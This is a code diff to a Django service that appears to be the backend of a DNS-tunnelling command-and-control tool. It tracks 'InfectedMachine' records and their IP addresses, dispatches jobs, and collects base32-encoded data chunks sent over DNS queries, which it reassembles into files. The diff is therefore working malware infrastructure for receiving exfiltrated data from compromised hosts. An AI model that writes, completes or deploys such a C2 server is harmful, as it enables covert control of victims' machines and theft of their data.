@@ -1,9 +1,11 @@
+import base64
 import os
 from datetime import datetime
 from random import randint
 from re import Match
 
 from decouple import config
+from django.utils import timezone
 
 from djangoproject.constants.DnsMatchEnum import DnsMatchEnum
 from djangoproject.models import InfectedMachine
@@ -11,54 +13,57 @@ from djangoproject.models import InfectedMachine
 
 class ExecService:
 
-    def test(self, query_type: DnsMatchEnum, data: Match):
+    def process(self, query_type: DnsMatchEnum, data: Match, client_ip: str):
         if query_type == DnsMatchEnum.GET_JOB:
-            self.process_job_get(data.group(1))
+            self.process_job_get(data.group(1), client_ip)
         elif query_type == DnsMatchEnum.RETURN_JOB_FRAGMENT:
             self.process_job_return_fragment(data.group(3), data.group(2), data.group(1))
         elif query_type == DnsMatchEnum.JOB_FINISHED:
-            self.process_job_finish(data.group(1), data.group(2))
+            self.process_job_finish(data.group(1))
 
-    def process_job_get(self, machine_id: str):
+    def process_job_get(self, machine_id: str, ip: str):
         machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
 
         if machine is None:
-            self.create_machine(machine_id)
+            machine = self.create_machine(machine_id)
 
-        if machine is not None:
-            machine.last_handshake_at = datetime.now()
-            machine.save()
+        machine.last_handshake_at = timezone.now()
+        machine.ip = ip
+        machine.save()
 
-    def process_job_return_fragment(self, machine_id: str, job_id: str, data: str):
+    def process_job_return_fragment(self, machine_id: str, data: str, chunk_id: str):
         machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
         if machine is None:
             return
 
-        job = machine.job_set.filter(id=job_id).first()
+        job = machine.get_current_job()
         if job is None:
             return
 
         data_folder = f"{config('FOLDER_DATA')}/{machine.id}/{job.id}"
         os.makedirs("folder/path", exist_ok=True)
 
-        # TODO
-        id_chunk = randint(1, 500)
-        with open(f"{data_folder}/fragment-{id_chunk}", "w") as f:
+        with open(f"{data_folder}/chunk-{chunk_id}", "w") as f:
             f.write(data)
 
-    def process_job_finish(self, machine_id: str, job_id: str):
+    def process_job_finish(self, machine_id: str):
         machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
         if machine is None:
             return
 
-        job = machine.job_set.filter(job_id=job_id).first()
+        job = machine.get_current_job()
         if job is None:
             return
 
         # TODO fusionner les fichiers
         data_folder = f"{config('FOLDER_DATA')}/{machine.id}/{job.id}"
+        chunks = [f for f in os.listdir(data_folder) if f.startswith('chunk-')]
         with open(f"{data_folder}/final-file", "w") as f:
-            f.write("")
+            for chunk in chunks:
+                with open(f"{data_folder}/{chunk}", "r") as c:
+                    f.write(
+                        base64.b32decode(c.read()).decode('UTF-8')
+                    )
 
     def create_machine(self, machine_id: str) -> InfectedMachine:
         machine = InfectedMachine(dns_identifier=machine_id)
